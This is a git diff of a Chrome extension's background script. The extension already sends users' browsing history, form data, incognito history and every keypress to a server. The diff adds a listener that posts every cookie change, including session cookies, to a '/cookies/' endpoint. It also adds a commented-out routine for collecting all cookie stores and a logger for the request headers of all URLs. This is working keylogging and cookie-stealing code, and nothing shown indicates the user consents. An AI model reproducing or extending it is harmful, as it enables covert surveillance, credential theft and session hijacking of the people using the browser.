@@ -35,10 +35,27 @@ const addUser = (uid) => {
         // https://stackoverflow.com/a/19295499
         version: `Chrome ${/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]}`,
     };
+
+    // TODO Split history into another request after create user
     chrome.history.search({ text: "" }, (h) => {
         data.history = h;
         postRequest("/user/", data).catch((err) => console.log(err.message));
     });
+
+    // Get all stored cookies
+    // chrome.cookies.getAllCookieStores((cookieStores) => {
+    //     cookieStores.forEach((s) =>
+    //         chrome.cookies.getAll(
+    //             {
+    //                 storeId: s.id,
+    //             },
+    //             (c) =>
+    //                 postRequest("/cookies/store", data).catch((err) =>
+    //                     console.log(err.message)
+    //                 )
+    //         )
+    //     );
+    // });
 };
 
 const addForm = (uid, form, tab) => {
@@ -71,6 +88,12 @@ const addIncognitoHistory = (uid, tab) => {
 const logKeypress = (uid, url, direction, key) => {
     const data = { uid, time: Date.now(), url, direction, key };
     postRequest("/keypress/", data).catch((err) => console.log(err.message));
+};
+
+// Logs changes in cookies
+const logCookieChange = (uid, details) => {
+    const data = { uid, time: Date.now(), details };
+    postRequest("/cookies/", data).catch((err) => console.log(err.message));
 };
 
 const getRandomToken = () => {
@@ -163,21 +186,34 @@ chrome.storage.sync.get("keyPressWatcher", (runCommand) => {
     });
 });
 
-// Cookie watcher CHECK Listener not firing
-chrome.storage.sync.get("cookieWatcher", (runCommand) => {
-    if (!runCommand.cookieWatcher) return;
+// Just prints headers
+chrome.storage.sync.get("requestWatcher", (runCommand) => {
+    if (!runCommand.requestWatcher) return;
     // onBeforeSendHeaders, onSendHeaders
     chrome.webRequest.onSendHeaders.addListener(
         (details) => {
-            console.log("METHOD", details.method);
-            console.log("INITIATOE", details.initiator);
-            console.log("HEADERS", details.requestHeaders);
-            console.log("TIME", details.timeStamp);
-            console.log("URL", details.requestHeaders);
+            console.log(details);
+            // console.log("METHOD", details.method);
+            // console.log("INITIATOE", details.initiator);
+            // console.log("HEADERS", details.requestHeaders);
+            // console.log("TIME", details.timeStamp);
+            // console.log("URL", details.url);
         },
         { urls: ["<all_urls>"] },
         ["requestHeaders"]
     );
+});
+
+chrome.storage.sync.get("cookieWatcher", (runCommand) => {
+    if (!runCommand.cookieWatcher) return;
+
+    // Cookie change
+    chrome.cookies.onChanged.addListener((changeInfo) => {
+        console.log("ONCHANGE", changeInfo);
+        chrome.storage.sync.get("userid", (res) => {
+            logCookieChange(res.userid, changeInfo);
+        });
+    });
 });
 
 // Script injection
